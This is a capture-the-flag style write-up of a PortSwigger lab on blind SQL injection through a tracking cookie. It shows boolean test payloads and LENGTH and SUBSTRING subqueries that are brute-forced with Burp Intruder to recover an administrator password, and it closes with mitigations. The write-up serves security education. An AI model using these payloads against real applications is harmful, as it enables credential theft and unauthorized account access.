# Blind SQL Injection with Conditional Responses

## Lab Information

| Category | SQL Injection |
|---|---|
| Lab Name | Blind SQL injection with conditional responses |
| Difficulty | Practitioner |
| Platform | PortSwigger Web Security Academy |

---

# Description

This lab demonstrates a Blind SQL Injection vulnerability using conditional responses and automated extraction techniques.

Unlike traditional SQL Injection vulnerabilities, the application did not directly display database errors or query results.

Instead, the attacker identified a vulnerable injection point inside the `TrackingId` cookie and used boolean-based conditions to observe differences in application responses.

The response behavior depended on whether the injected SQL condition evaluated to:
- TRUE
- FALSE

The appearance of the following message acted as the success indicator:

```text
Welcome back!
```

Using this behavior, the administrator password length and password characters were extracted step-by-step through Burp Suite Intruder.

---

# Vulnerability Type

- Blind SQL Injection (Blind SQLi)
- Boolean-Based SQL Injection
- Conditional Response SQL Injection

---

# Impact

An attacker can extract sensitive database information even when:
- database errors are hidden
- query results are not directly displayed
- application responses appear normal

This may lead to:
- credential disclosure
- unauthorized administrator access
- database enumeration
- sensitive data exposure
- complete database compromise

Blind SQL Injection vulnerabilities remain highly critical despite limited visible feedback.

---

# Steps to Reproduce

1. Open the target application.
2. Click the **My Account** button.
3. Capture the `/login` request using Burp Suite.
4. Identify the vulnerable `TrackingId` cookie.
5. Test SQL Injection using:
   
```sql
TrackingId=PIJz9QYdQ6uZFbnw' AND 1=1--;
```

6. Observe that the response contains:

```text
Welcome back!
```

7. Modify the payload to:

```sql
TrackingId=PIJz9QYdQ6uZFbnw' AND 1=2--;
```

8. Observe that the `Welcome back!` message disappears.
9. Confirm Blind SQL Injection vulnerability.
10. Determine password length using:

```sql
TrackingId=PIJz9QYdQ6uZFbnw' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = 1--;
```

11. Send the payload to Burp Suite Intruder.
12. Identify the correct password length based on the response containing `Welcome back!`.
13. Extract password characters using substring-based payloads:

```sql
TrackingId=PIJz9QYdQ6uZFbnw' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),$1$,1)='$a$';--
```

14. Use Burp Intruder payload positions:
   - Position 1 → numeric range from 1–20
   - Position 2 → brute force characters

15. Filter responses containing `Welcome back!`.
16. Reconstruct the administrator password character-by-character.
17. Login using the extracted administrator credentials.
18. The lab gets successfully solved.

---

# Proof of Concept (PoC)

## Step 1 — Accessing the Main Website

The application initially appears to be a normal website containing a **My Account** functionality.

![Main Website](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Conditional%20Responses/screenshots/lab9.png?raw=true)

**Caption:** Initial application interface before exploitation.

---

## Step 2 — Navigating to the Login Page

After clicking the **My Account** button, the login page became visible.

The page displayed:
- Home
- Welcome Back!
- My Account

![Login Page](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Conditional%20Responses/screenshots/lab9(1).png?raw=true)

**Caption:** Login page containing the Welcome Back! message.

---

## Step 3 — Capturing the Login Request

The login request was intercepted using Burp Suite.

```text
/login
```

During inspection, an interesting cookie named:

```http
TrackingId
```

was identified.

![Captured Request](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Conditional%20Responses/screenshots/lab9(2).png?raw=true)

**Caption:** Capturing the login request and identifying the vulnerable TrackingId cookie.

---

## Step 4 — Confirming SQL Injection

The following payload was injected into the `TrackingId` cookie:

```sql
TrackingId=PIJz9QYdQ6uZFbnw' AND 1=1--;
```

The response still contained:

```text
Welcome back!
```

However, changing the payload to:

```sql
TrackingId=PIJz9QYdQ6uZFbnw' AND 1=2--;
```

removed the `Welcome back!` message.

This confirmed that the application was vulnerable to Blind SQL Injection.

![Blind SQLi Confirmation](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Conditional%20Responses/screenshots/lab9(3).png?raw=true)

**Caption:** Confirming Blind SQL Injection using TRUE and FALSE conditions.

---

## Step 5 — Determining the Password Length

The following payload was crafted to determine the administrator password length:

```sql
TrackingId=PIJz9QYdQ6uZFbnw' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = 1--;
```

![Password Length Payload](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Conditional%20Responses/screenshots/lab9(4).png?raw=true)

**Caption:** Creating a payload to determine the administrator password length.

---

## Step 6 — Sending the Payload to Intruder

The payload was sent to Burp Suite Intruder for automated testing.

![Intruder Setup](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Conditional%20Responses/screenshots/lab9(5).png?raw=true)

**Caption:** Sending the password length payload to Burp Suite Intruder.

---

## Step 7 — Identifying the Password Length

The Intruder results showed that the response containing:

```text
Welcome back!
```

appeared at request number `20`.

This confirmed that the administrator password length was **20 characters**.

![Password Length Result](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Conditional%20Responses/screenshots/lab9(6).png?raw=true)

**Caption:** Identifying the administrator password length through conditional responses.

---

## Step 8 — Preparing Character Extraction Payload

A substring-based payload was crafted to extract password characters one-by-one:

```sql
TrackingId=PIJz9QYdQ6uZFbnw' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),$1$,1)='$a$';--
```

Payload position:
- `$1$` → character position
- `$a$` → brute-forced character

![Substring Payload](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Conditional%20Responses/screenshots/lab9(7).png?raw=true)

**Caption:** Creating a substring-based payload for password extraction.

---

## Step 9 — Configuring Intruder Payload Positions

Burp Suite Intruder payload positions were configured:
- Position 1 → numbers from 1 to 20
- Position 2 → brute-force character set

![Intruder Payload Positions](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/Blind%20SQL%20Injection%20with%20Conditional%20Responses/screenshots/lab9(8).png?raw=true)

**Caption:** Configuring Burp Suite Intruder payload positions.

---

## Step 10 — Running the Intruder Attack

The Intruder attack was executed to identify valid password characters.

![Intruder Attack](screenshots/blind-sqli-conditional-10.png)

**Caption:** Running automated Blind SQL Injection character extraction.

---

## Step 11 — Filtering Valid Responses

Using Intruder response filtering, requests containing:

```text
Welcome back!
```

were identified as valid.

The extracted characters were noted sequentially using a text editor until the full password was reconstructed.

![Response Filtering](screenshots/blind-sqli-conditional-11.png)

**Caption:** Filtering valid responses containing the Welcome Back! message.

---

## Step 12 — Logging into the Administrator Account

The extracted administrator credentials were used on the login page.

![Administrator Login](screenshots/blind-sqli-conditional-12.png)

**Caption:** Attempting login using extracted administrator credentials.

---

## Step 13 — Successful Administrator Access

The administrator login succeeded successfully.

The lab was solved successfully.

![Administrator Access](screenshots/blind-sqli-conditional-13.png)

**Caption:** Successful administrator login after extracting credentials via Blind SQL Injection.

---

# Why It Works

The application directly inserted user-controlled cookie data into backend SQL queries without proper sanitization.

The attacker used:
- boolean-based SQL conditions
- conditional response analysis
- substring extraction
- automated brute force techniques

to infer sensitive database information.

The application revealed TRUE/FALSE conditions through the presence or absence of the:

```text
Welcome back!
```

message.

This allowed extraction of the administrator password one character at a time without directly displaying database results.

---

# Security Risk

This vulnerability can result in:
- credential disclosure
- database enumeration
- unauthorized administrator access
- sensitive data exposure
- complete database compromise

Blind SQL Injection vulnerabilities remain extremely dangerous despite limited feedback.

---

# Recommended Mitigation

- Use parameterized queries (prepared statements).
- Never concatenate user input into SQL queries.
- Apply strict input validation.
- Securely handle cookies and user-controlled headers.
- Restrict database permissions using least privilege principles.

---

# Learning Section

## What I Learned

- Blind SQL Injection can extract sensitive data without directly displaying database results.
- Conditional responses can reveal whether SQL conditions evaluate to TRUE or FALSE.
- Burp Suite Intruder can automate Blind SQL Injection attacks.
- SQL functions such as `LENGTH()` and `SUBSTRING()` help extract hidden database values.
- Even hidden response differences can leak sensitive backend information.

---

# Tools Used

- Burp Suite
- Burp Intruder
- Burp Repeater
- Firefox Developer Tools
- PortSwigger Web Security Academy

---

# Conclusion

This lab demonstrated a Blind SQL Injection vulnerability using conditional responses through the `TrackingId` cookie.

By leveraging boolean-based SQL conditions and Burp Suite Intruder automation, the administrator password was extracted character-by-character without directly viewing database query results, ultimately allowing unauthorized administrator access.
